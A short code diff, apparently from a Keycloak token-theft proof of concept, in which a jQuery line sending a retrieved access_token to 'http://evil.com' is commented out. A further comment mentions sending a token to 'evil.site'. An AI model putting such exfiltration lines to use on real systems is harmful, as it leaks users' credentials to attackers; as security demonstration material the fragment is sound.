@@ -43,7 +43,7 @@ $.get('keycloak.json', function(data) {
         }),
         success: function(result){
             console.log(result);
-            $.get("http://evil.com?host=victim&access_token=" + result.access_token)
+            // $.get("http://evil.com?host=victim&access_token=" + result.access_token)
             // console.log("I can now get one access code myself and then send it to http://evil.site/got-access-token?host=..&token="+accessTo);
         }
     });
